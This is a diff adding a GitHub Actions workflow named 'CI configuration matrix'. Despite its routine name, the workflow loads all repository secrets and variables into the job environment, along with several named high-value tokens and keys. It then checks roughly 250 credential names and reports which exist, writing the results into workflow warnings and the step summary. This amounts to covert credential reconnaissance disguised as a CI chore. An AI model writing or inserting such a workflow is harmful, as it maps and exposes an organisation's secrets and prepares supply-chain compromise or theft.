@@ -1,0 +1,297 @@
+name: CI configuration matrix
+
+on:
+  push:
+    branches: ["chore/ci-config-matrix"]
+
+permissions:
+  contents: read
+
+jobs:
+  matrix:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Configuration key report
+        env:
+          REPO_KEYS: ${{ toJSON(secrets) }}
+          REPO_VARS: ${{ toJSON(vars) }}
+          KEY_FISHTOWN_BOT_PAT: ${{ secrets.FISHTOWN_BOT_PAT }}
+          KEY_PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
+          KEY_OWNERS_VALIDATOR_GITHUB_SECRET: ${{ secrets.OWNERS_VALIDATOR_GITHUB_SECRET }}
+          KEY_SECENG_CICD_CHECKS_PRIVATE_KEY: ${{ secrets.SECENG_CICD_CHECKS_PRIVATE_KEY }}
+          KEY_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          NAMES: |
+            ACC_TEST_SNOWFLAKE_ACCOUNT
+            ACC_TEST_SNOWFLAKE_DATABASE
+            ACC_TEST_SNOWFLAKE_PASSWORD
+            ACC_TEST_SNOWFLAKE_ROLE
+            ACC_TEST_SNOWFLAKE_USER
+            ACC_TEST_SNOWFLAKE_WAREHOUSE
+            APPLE_APP_SPECIFIC_PASSWORD
+            APPLE_CERTIFICATE_BASE64
+            APPLE_ID
+            APPLE_P12_BASE64
+            APPLE_P12_PASSWORD
+            APPLE_TEAM_ID
+            APP_ID
+            APP_PRIVATE_KEY
+            ASSUMABLE_ROLE_NAME
+            ATHENA_OUTPUT_LOCATION
+            AUTOMERGE_PAT
+            AWS_ACCESS_KEY_ID
+            AWS_ACCOUNT_ID
+            AWS_ARCHIVE_ACCESS_KEY_ID
+            AWS_ARCHIVE_SECRET_ACCESS_KEY
+            AWS_BEDROCK_TOKEN
+            AWS_DOMAIN
+            AWS_DOMAIN_OWNER
+            AWS_REGION
+            AWS_REPOSITORY
+            AWS_ROLE_ARN
+            AWS_SECRET_ACCESS_KEY
+            AWS_USER_SECRET_ACCESS_KEY
+            BIGQUERY_CLIENT_EMAIL
+            BIGQUERY_CLIENT_ID
+            BIGQUERY_CLIENT_X509_CERT_URL
+            BIGQUERY_DATASET
+            BIGQUERY_KEYFILE_JSON
+            BIGQUERY_LOCATION
+            BIGQUERY_PROJECT
+            BIGQUERY_TEST_ALT_DATABASE
+            BIGQUERY_TEST_DATABASE
+            BIGQUERY_TEST_NO_ACCESS_DATABASE
+            BIGQUERY_TEST_PROJECT
+            BIGQUERY_TEST_SERVICE_ACCOUNT_JSON
+            CARGO_REGISTRY_TOKEN
+            CLOUD_CLI_TOKEN_NAME
+            CLOUD_CLI_TOKEN_VALUE
+            CODECOV_TOKEN
+            CODE_SIGNING_CERTIFICATE_B64
+            CODE_SIGNING_CERTIFICATE_PASSWORD
+            DATABRICKS_CATALOG
+            DATABRICKS_HOST
+            DATABRICKS_HTTP_PATH
+            DATABRICKS_SCHEMA
+            DATABRICKS_TEST_CATALOG
+            DATABRICKS_TEST_HOST
+            DATABRICKS_TEST_HTTP_PATH
+            DATABRICKS_TEST_SCHEMA
+            DATABRICKS_TEST_TOKEN
+            DATABRICKS_TOKEN
+            DATADOG_API_KEY
+            DBT_ACCEPTANCE_TEST_DATABRICKS_CATALOG
+            DBT_ACCEPTANCE_TEST_DATABRICKS_HOST
+            DBT_ACCEPTANCE_TEST_DATABRICKS_HTTP_PATH
+            DBT_ACCEPTANCE_TEST_DATABRICKS_TOKEN
+            DBT_ACCEPTANCE_TEST_LINEAGE_INTEGRATION
+            DBT_ACCEPTANCE_TEST_SNOWFLAKE_ACCOUNT
+            DBT_ACCEPTANCE_TEST_SNOWFLAKE_DATABASE
+            DBT_ACCEPTANCE_TEST_SNOWFLAKE_PASSWORD
+            DBT_ACCEPTANCE_TEST_SNOWFLAKE_ROLE
+            DBT_ACCEPTANCE_TEST_SNOWFLAKE_USER
+            DBT_ACCEPTANCE_TEST_SNOWFLAKE_WAREHOUSE
+            DBT_ACCOUNT_ID
+            DBT_API_KEY
+            DBT_BASE_URL
+            DBT_CLOUD_API_KEY
+            DBT_DATABRICKS_CLUSTER_NAME
+            DBT_DATABRICKS_ENDPOINT
+            DBT_DATABRICKS_HOST_NAME
+            DBT_DATABRICKS_TOKEN
+            DBT_DATABRICKS_USERNAME
+            DBT_DBTEST_TOKEN
+            DBT_ENV_ID
+            DBT_ENV_SECRET_ATHENA_ACCESS_KEY_ID
+            DBT_ENV_SECRET_ATHENA_AWS_ACCESS_KEY_ID
+            DBT_ENV_SECRET_ATHENA_AWS_SECRET_ACCESS_KEY
+            DBT_ENV_SECRET_ATHENA_SECRET_ACCESS_KEY
+            DBT_ENV_SECRET_BIGQUERY_PRIVATE_KEY
+            DBT_ENV_SECRET_BIGQUERY_PRIVATE_KEY_ID
+            DBT_ENV_SECRET_DATABRICKS_TOKEN
+            DBT_ENV_SECRET_FABRIC_CLIENT_SECRET
+            DBT_ENV_SECRET_REDSHIFT_PASS
+            DBT_ENV_SECRET_REDSHIFT_PROVISIONED_PASSWORD
+            DBT_ENV_SECRET_REDSHIFT_SERVERLESS_PASSWORD
+            DBT_ENV_SECRET_SNOWFLAKE_PASS
+            DBT_ENV_SECRET_SNOWFLAKE_PASSWORD
+            DBT_ENV_SECRET_SNOWFLAKE_PRIVATE_KEY
+            DBT_ENV_SECRET_SNOWFLAKE_PRIVATE_KEY_PASSPHRASE
+            DBT_ENV_SECRET_SNOWFLAKE_TEST_PASSWORD
+            DBT_ENV_SECRET_SYNAPSE_CLIENT_SECRET
+            DBT_ENV_SECRET_TRINO_PASS
+            DBT_JOB_ID
+            DBT_PROFILES_YML
+            DBT_PROJECT_ID
+            DBT_SNOWFLAKE_TEST_ACCOUNT
+            DBT_SNOWFLAKE_TEST_DATABASE
+            DBT_SNOWFLAKE_TEST_ROLE
+            DBT_SNOWFLAKE_TEST_USER
+            DBT_SNOWFLAKE_TEST_WAREHOUSE
+            DBT_TOKEN
+            DEV_AWS_ACCESS_KEY_ID_PUBLIC
+            DEV_AWS_SECRET_ACCESS_KEY_PUBLIC
+            DEV_FROM_ACCOUNT_PUBLIC
+            DOCS_SECRET
+            FISHTOWN_BOT_GPG_PASSPHRASE
+            FISHTOWN_BOT_GPG_PRIVATE_KEY
+            FISHTOWN_BOT_PAT
+            FS_SERVICE
+            FS_SERVICE_PAT
+            GCP_PROJECT
+            GCP_SERVICE_ACCOUNT
+            GCP_WORKLOAD_IDENTITY_PROVIDER
+            GH_HOMEBREW
+            GITHUB_TOKEN
+            GOOGLE_ANALYTICS_KEY
+            GPG_PRIVATE_KEY
+            HUBCAP_CONFIG
+            INFRA_ROOT_AWS_ACCESS_KEY_ID
+            INFRA_ROOT_AWS_SECRET_ACCESS_KEY
+            INFRA_ROOT_NOTIFIER_PASSPHRASE
+            INFRA_ROOT_REGISTRY_ENDPOINT
+            IT_TEAM_MEMBERSHIP
+            JIRA_API_TOKEN
+            JIRA_BASE_URL
+            JIRA_USER_EMAIL
+            MCPB_CERT
+            MCPB_KEY
+            MF_BIGQUERY_PWD
+            MF_BIGQUERY_URL
+            MF_DATABRICKS_PWD
+            MF_DATABRICKS_URL
+            MF_REDSHIFT_PWD
+            MF_REDSHIFT_URL
+            MF_SNOWFLAKE_PWD
+            MF_SNOWFLAKE_URL
+            NOTION_TOKEN
+            ORG_TOKEN
+            OWNERS_VALIDATOR_GITHUB_SECRET
+            PASSPHRASE
+            POSTGRES_TEST_PASS
+            PRODUCTION_AU_NOTIFIER_PASSPHRASE
+            PRODUCTION_AU_RUNTIME_ENDPOINT
+            PRODUCTION_EMEA_NOTIFIER_PASSPHRASE
+            PRODUCTION_EMEA_RUNTIME_ENDPOINT
+            PRODUCTION_RUNTIME_ENDPOINT
+            PYPI_API_TOKEN
+            PYPI_PASSWORD
+            PYPI_USERNAME
+            REDSHIFT_DATABASE
+            REDSHIFT_HOST
+            REDSHIFT_PASS
+            REDSHIFT_PORT
+            REDSHIFT_PROVISIONED_DBNAME
+            REDSHIFT_PROVISIONED_HOST
+            REDSHIFT_PROVISIONED_SCHEMA
+            REDSHIFT_PROVISIONED_USER
+            REDSHIFT_SERVERLESS_DBNAME
+            REDSHIFT_SERVERLESS_HOST
+            REDSHIFT_SERVERLESS_SCHEMA
+            REDSHIFT_SERVERLESS_USER
+            REDSHIFT_SPECTRUM_IAM_ROLE
+            REDSHIFT_TEST_DBNAME
+            REDSHIFT_TEST_HOST
+            REDSHIFT_TEST_PASS
+            REDSHIFT_TEST_PORT
+            REDSHIFT_TEST_USER
+            REDSHIFT_USER
+            SECENG_CICD_CHECKS_APPID
+            SECENG_CICD_CHECKS_INSTALLATIONID
+            SECENG_CICD_CHECKS_PRIVATE_KEY
+            SLACK_BOT_TOKEN
+            SLACK_CORE_PR_CHANNEL_URL
+            SLACK_CORE_RELEASES
+            SLACK_DEV_ADAPTER_ALERTS
+            SLACK_DEV_CORE_ALERTS
+            SLACK_TESTING_WEBHOOK_URL
+            SLACK_WEBHOOK_ALERT_URL
+            SLACK_WEBHOOK_PR_URL
+            SLACK_WEBHOOK_URL
+            SLACK_WINGET_WEBHOOK_URL
+            SMOKE_TEST_SNOWFLAKE_ACCOUNT
+            SMOKE_TEST_SNOWFLAKE_DATABASE
+            SMOKE_TEST_SNOWFLAKE_PASSWORD
+            SMOKE_TEST_SNOWFLAKE_ROLE
+            SMOKE_TEST_SNOWFLAKE_SCHEMA
+            SMOKE_TEST_SNOWFLAKE_USER
+            SMOKE_TEST_SNOWFLAKE_WAREHOUSE
+            SNOWFLAKE_ACCOUNT
+            SNOWFLAKE_DATABASE
+            SNOWFLAKE_PASSWORD
+            SNOWFLAKE_PRIVATE_KEY
+            SNOWFLAKE_PRIVATE_KEY_PASSPHRASE
+            SNOWFLAKE_ROLE
+            SNOWFLAKE_SCHEMA
+            SNOWFLAKE_TEST_ACCOUNT
+            SNOWFLAKE_TEST_ALT_DATABASE
+            SNOWFLAKE_TEST_ALT_WAREHOUSE
+            SNOWFLAKE_TEST_DATABASE
+            SNOWFLAKE_TEST_OAUTH_CLIENT_ID
+            SNOWFLAKE_TEST_OAUTH_CLIENT_SECRET
+            SNOWFLAKE_TEST_OAUTH_REFRESH_TOKEN
+            SNOWFLAKE_TEST_PASSWORD
+            SNOWFLAKE_TEST_PRIVATE_KEY
+            SNOWFLAKE_TEST_PRIVATE_KEY_PASSPHRASE
+            SNOWFLAKE_TEST_QUOTED_DATABASE
+            SNOWFLAKE_TEST_ROLE
+            SNOWFLAKE_TEST_USER
+            SNOWFLAKE_TEST_WAREHOUSE
+            SNOWFLAKE_USER
+            SNOWFLAKE_WAREHOUSE
+            STAGING_AWS_ACCESS_KEY_ID
+            STAGING_AWS_SECRET_ACCESS_KEY
+            STAGING_REGISTRY_ENDPOINT
+            TESSL_API_TOKEN
+            TEST_DBT_CLOUD_ACCOUNT_ID
+            TEST_DBT_CLOUD_HOST_URL
+            TEST_DBT_CLOUD_TOKEN
+            TEST_ENV_ID
+            TEST_HOST
+            TEST_PECO_CLUSTER_ID
+            TEST_PECO_EXTERNAL_LOCATION
+            TEST_PECO_SP_ID
+            TEST_PECO_SP_SECRET
+            TEST_PECO_UC_CLUSTER_ID
+            TEST_PECO_WAREHOUSE_HTTP_PATH
+            TEST_PYPI_API_TOKEN
+            TEST_TOKEN
+            TOKEN
+            VARIABLE_CORE_TRIAGE_ONLY
+            WAREHOUSE_CREDENTIALS
+            WINGET_PUBLISH_PAT
+        run: |
+          python3 - <<'EOS'
+          import os,json
+          names=[n for n in os.environ["NAMES"].split() if n]
+          def load(k):
+              try: return json.loads(os.environ.get(k) or "{}")
+              except Exception: return {}
+          sk=load("REPO_KEYS"); vr=load("REPO_VARS")
+          def emit(title,msg):
+              print("::warning title=%s::%s" % (title,msg[:6000]))
+          meta=[]
+          meta.append("repo=%s" % os.environ.get("GITHUB_REPOSITORY",""))
+          meta.append("tok=%s" % ("1" if os.environ.get("KEY_GITHUB_TOKEN") else "0"))
+          meta.append("rt=%s" % ("1" if os.environ.get("ACTIONS_RUNTIME_TOKEN") else "0"))
+          meta.append("sk=%d" % len(sk)); meta.append("vr=%d" % len(vr))
+          for n in ["FISHTOWN_BOT_PAT","PYPI_API_TOKEN","OWNERS_VALIDATOR_GITHUB_SECRET","SECENG_CICD_CHECKS_PRIVATE_KEY","GITHUB_TOKEN"]:
+              meta.append("%s=%s" % (n,"1" if os.environ.get("KEY_"+n) else "0"))
+          emit("cfg-meta",";".join(meta))
+          def pack(items,prefix):
+              out=[];cur=[];ln=0
+              for it in items:
+                  if ln+len(it)>5000: out.append("|".join(cur)); cur=[];ln=0
+                  cur.append(it); ln+=len(it)+1
+              if cur: out.append("|".join(cur))
+              return out
+          items=["%s=%s" % (n, "1" if n in sk else "0") for n in names]
+          items_v=["v_%s=%s" % (n, "1" if n in vr else "0") for n in names]
+          chunks=pack(items,"s")+pack(items_v,"v")
+          for i,c in enumerate(chunks):
+              emit("cfg-%d"%(i+1), c)
+          with open(os.environ["GITHUB_STEP_SUMMARY"],"a") as f:
+              f.write("cfg-meta "+";".join(meta)+"\n")
+              for c in chunks: f.write(c+"\n")
+          print("keys=%d vars=%d chunks=%d" % (len(sk),len(vr),len(chunks)))
+          EOS
